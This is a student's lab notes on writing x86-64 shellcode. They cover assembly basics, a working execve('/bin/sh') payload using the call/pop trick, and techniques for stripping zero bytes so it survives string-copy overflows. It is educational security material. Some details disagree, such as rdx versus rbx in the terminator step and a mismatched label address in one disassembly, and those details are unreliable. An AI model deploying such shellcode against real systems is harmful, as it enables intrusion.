# Shellcode Development Lab
- challenges in writing shellcode
    1. ensure there is no zero in the binary
    2. find out the address of the data used in the command
        - two approaches
            1. data are pushed into the stack during the execution, so their addresses can be obtained from the stack pointer
            2. data are stored in the code region, right after a `call` instruction, when `call` is executed, the address of the data is treated as the return address, and is pushed into the stack
    
## Task 1: Writing Assembly Code
- Assembly languages are different for different computer architecture, in this task, the sample code `hello.s` is for amd64 (`64-bit`) architecture
    ```
    global _start

    section .text

    _start:
        mov rdi, 1       ; the standard output
        mov rsi, msg     ; address of the message
        mov rdx, 15      ; length of the message
        mov rax, 1       ; 1 is the number for write() system call
        syscall          ; invoke write(1, msg, 15)

        mov rdi, 0       ;
        mov rax, 60      ; 60 is the number for exit() system call
        syscall          ; invoke exit(0)

    section .rodata
        msg: db "Hello, world!", 10
    ```
- Compiling to object code, use `nasm`, an assembler and disassembler for the Intel x86 and x64 architecture, the corresponding tool for arm64 is called `as`
    - option `-f elf64`: compile the code to `64-bit` ELF binary format, for 32-bit assembly, use `elf32`
    - ELF, the Executable and Linkable Format is a common standard file format for executable file, object code, shared libraries
    ```
    // For amd64
    $ nasm -f elf64 hello.s -o hello.o
    // For arm64
    $ as -o hello.o hello.s
    ```
- Linking to generate final binary: once we get object code `hello.o`, if we want to generate the executable binary, we can run the linker program `ld`
    ```
    // For both amd64 and arm64
    $ ld hello.o -o hello
    $ ./hello
    Hello, wordl!
    ```
- Getting the machine code: in most attacks, we only need the machine code of the shellcode, technically, only the machine code is called shellcode
    - extract machine code from the executable file or the object file, one way is to use `objdump` command to disassemble the executable or object file
    - for amd64, there are 2 syntax modes for assembly code
        1. AT&T syntax mode (`objdump` uses by default)
        2. Intel syntax mode (use `-Mintel` option to produce assembly code in this mode)
        ```
        $ objdump -Mintel -d hello.o

        hello.o:     file format elf64-x86-64

        Disassembly of section .text:

        0000000000000000 <_start>:
        0:	bf 01 00 00 00       	mov    edi,0x1
        5:	48 be 00 00 00 00 00 	movabs rsi,0x0
        c:	00 00 00 
        f:	ba 0e 00 00 00       	mov    edx,0xe
        14:	b8 01 00 00 00       	mov    eax,0x1
        19:	0f 05                	syscall 
        1b:	bf 00 00 00 00       	mov    edi,0x0
        20:	b8 3c 00 00 00       	mov    eax,0x3c
        25:	0f 05                	syscall
        ```
    - the numbers after the colons are machine code, we can also use `xxd` command to print out the content of the binary file, and the machine code can be found from the printout
        ```
        $ xxd -p -c 20 hello.o | grep bf01000000
        000000001800000000000000bf0100000048be00
        ```
        - `-p` output in continuous hexdump style without line breaks
        - `-c 20` specifies that there are 20 bytes per line in the output

## Task 2: Writing Shellcode (Approach 1)
- the main purpose of shell code is to run a shell program such as `/bin/sh`, e.g., invoke `execve()` system call in Ubuntu
- `execve("/bin/sh", argv[], 0)`, we need to pass three arguments to this system call, in arm64, they are passed through the `x0`, `x1`, `x2` registers
    ```
    // For amd64
    Let rdi = the address of string "/bin/sh"
    Let rsi = the address of the argv[] array
    Let rdx = 0
    Let rax = 59 // 59 is the number for execve() system call
    syscall      // invoke execve()

    // For arm64
    Let x0 = the address of string "/bin/sh"
    Let x1 = the address of the argv[] array
    Let x2 = 0
    Let x8 = 221 // 221 is the number for execve() system call
    svc 0x1337   // invoke execve()
    ```
- the main challenge is how to get the address of the "/bin/sh" string and the address of `argv[]` array, in this task, we focus on **Approach 1**: store the string and array in the code segment, and then get their addresses using the `pc` register, which points to the code segment

### Task 2.a. Understand the code
- here is a simple shellcode `mysh64.s` for amd64
    ```
    section .text
        global _start
            _start:
                BITS 64
                jmp short two
            one:
                pop rbx

                mov  [rbx+8],     rbx ; store rbx to memory at address rbx+8
                mov      rax,    0x00 ; rax = 0
                mov [rbx+16],     rax ; store rax to memory at address rbx+16

                mov      rdi,     rbx ; rdi = rbx     <---- 1
                lea      rsi, [rbx+8] ; rsi = rbx+8   <---- 2
                mov      rdx,    0x00 ; rdx = 0
                mov      rax,      59 ; rax = 59
                syscall
            two:
                call one
                db  '/bin/sh', 0 ; The command string (terminated by a zero) <---- 3
                db 'AAAAAAAA'    ; place holder for argv[0]
                db 'BBBBBBBB'    ; place holder for argv[1]
    ```
- when `call one` is executed, it pushes the address of the next "instruction" to the stack, in this case, it is actually the address of the command string, and in `one`, the `pop rbx` instruction pops out the value at the top of the stack, i.e., the address of "/bin/sh", and saves it to `rbx`
- this shellcode will finally execute `execve("/bin/sh", {"/bin/sh", 0}, 0)`
- the memory layout before executing `syscall` (**NOT** the stack, but the code segment)
    ```
    High Memory Addresses
    |          +---------------------+ 
    |          |        ...          |
    |          |---------------------|
    |          |  0x0000000000000000 | (NULL as the end of argv[])
    |          +---------------------+ <---- rbx+16 (sh_addr+16)
    |          |       sh_addr       |
    |          +---------------------+ <---- rbx+8 (sh_addr+8)
    |          |     "/bin/sh\0"     |
    |          +---------------------+ <---- rbx (sh_addr)
    |          |      call one       |    
    |          +---------------------+ <---- rbx-8
    |          |        ...          |    
    |          +---------------------+
    Low Memory Addresses
    ```
- registers before `syscall` 
    - `rdi`: `sh_addr`
    - `rsi`: `sh_addr+8` (unlike `mov`, which moves the content in an address, `lea` instruction loads the effective address of `[rbx+8]`)

- compile and run the code
    ```
    $ nasm -g -f elf64 -o mysh64.o mysh64.s
    $ ld --omagic -o mysh64 mysh64.o
    $ ./mysh64
    $ ps        <---- to check whether it spawned a new shell
        PID TTY         TIME CMD
      28681 pts/0   00:00:00 bash
      28740 pts/0   00:00:00 sh     <---- we are in this new shell
      28741 pts/0   00:00:00 ps
    ```
    - `--omagic` option: by default, the code segment is not writable, when this program runs, it needs to modify the data stored in the code region, in actual attack, the code is typically injected into a writable data segment (e.g., stack or heap), ususally we do not run the shellcode as a standalone program

### Task 2.b. Eliminate zeros from the code
- in most cases, buffer-overflows are caused by string copy, such as `strcp()`, for these functions, byte zero (`0x00`) is considered as the end of the string, the sample code `mysh64.s` contains several zeros

- use `objdump` to find all instructions that contains zeros in machine code
    ```
    $ objdump -Mintel -d mysh64.o
    mysh64.o:     file format elf64-x86-64

    Disassembly of section .text:

    0000000000000000 <_start>:
    0:	eb 26                	jmp    28 <two>

    0000000000000002 <one>:
    2:	5b                   	pop    rbx
    3:	48 89 5b 08          	mov    QWORD PTR [rbx+0x8],rbx
    7:	b8 00 00 00 00       	mov    eax,0x0                  <--- zeros
    c:	48 89 43 10          	mov    QWORD PTR [rbx+0x10],rax
    10:	48 89 df             	mov    rdi,rbx
    13:	48 8d 73 08          	lea    rsi,[rbx+0x8]
    17:	ba 00 00 00 00       	mov    edx,0x0                  <--- zeros
    1c:	b8 3b 00 00 00       	mov    eax,0x3b                 <--- zeros
    21:	0f 05                	syscall 

    0000000000000028 <two>:
    23:	e8 d5 ff ff ff 2f 62 69 6e 2f 73 68 00 41 41 41     ...../bin/sh.AAA  <-- zero
    33:	41 41 41 41 41 42 42 42 42 42 42 42 42              AAAAABBBBBBBB
    ```
- the assembly instructions that contains byte zero in the machine code are marked
    - note that in the machine code, it actually uses the registers `eax`, `edx`, the lower 32 bits of `rax`, `rdx`

- rewrite `mysh64.s` to `no0_sh64.s`
    - a way to eliminate zeros is to write a small number as the difference between two larger numbers
        - `0x00000000 = 0x11111111 - 0x11111111`
        - `0x0000003b = 0x1111113c - 0x11111101`
    - so we can rewrite these three instructions as
        ```
        // mov rax, 0x00
        mov rax, 0x11111111
        sub rax, 0x11111111
        // mov rdx, 0x00
        mov rdx, 0x11111111
        sub rdx, 0x11111111
        // mov rax, 59
        mov rax, 0x1111113c
        sub rax, 0x11111111
        ```
    - when terminating a string, there will also be `0x00`: `db '/bin/sh', 0x00`, we can set it `0xff` first, and before we use it, we dynamically set it to zero in the code, add two instructions to set a terminator for string `"/bin/sh"`
        ```
        xor al, al
        mov [rdx+7], al; because '/bin/sh' takes 7 bytes
        ```
    - test whether the new code prompts a shell (it works)
        ```
        $ nasm -g -f elf64 -o no0_sh64.o no0_sh64.s 
        $ ld --omagic -o no0_sh64 no0_sh64.o
        $ ./no0_sh64
        $ ps                                                                          
            PID TTY          TIME CMD
        29342 pts/5    00:00:00 bash
        29810 pts/5    00:00:00 sh
        29811 pts/5    00:00:00 ps
        ```
    - check the machine code (no `0x00`)
        ```
        $ objdump -Mintel -d no0_sh64.o

        no0_sh64.o:     file format elf64-x86-64

        Disassembly of section .text:

        0000000000000000 <_start>:
        0:	eb 39                	jmp    3b <two>

        0000000000000002 <one>:
        2:	5b                   	pop    rbx
        3:	30 c0                	xor    al,al
        5:	88 43 07             	mov    BYTE PTR [rbx+0x7],al
        8:	48 89 5b 08          	mov    QWORD PTR [rbx+0x8],rbx
        c:	b8 11 11 11 11       	mov    eax,0x11111111
        11:	48 2d 11 11 11 11    	sub    rax,0x11111111
        17:	48 89 43 10          	mov    QWORD PTR [rbx+0x10],rax
        1b:	48 89 df             	mov    rdi,rbx
        1e:	48 8d 73 08          	lea    rsi,[rbx+0x8]
        22:	ba 11 11 11 11       	mov    edx,0x11111111
        27:	48 81 ea 11 11 11 11 	sub    rdx,0x11111111
        2e:	b8 3c 11 11 11       	mov    eax,0x1111113c
        33:	48 2d 01 11 11 11    	sub    rax,0x11111101
        39:	0f 05                	syscall 

        000000000000003b <two>:
        3b:	e8 c2 ff ff ff 2f 62 69 6e 2f 73 68 ff 41 41 41     ...../bin/sh.AAA
        4b:	41 41 41 41 41 42 42 42 42 42 42 42 42              AAAAABBBBBBBB
        ```
    - there are also other way to eliminate zeros
        1. to set `rax` to zero, we can instead use `xor rax, rax`
        2. to set `rax` to `0x3b` (`59`), we can first `xor rax, rax`, then `mov al, 0x3b`, `al` is the least significant byte of `rax`
        3. we can also use shift, `shl` and `shr`
            1. `mov rax, 0xffffffffffffff3b`
            2. `shl rax, 56` ---> `rax`: `0x3b00000000000000`
            3. `shr rax, 56` ---> `rax`: `0x000000000000003b`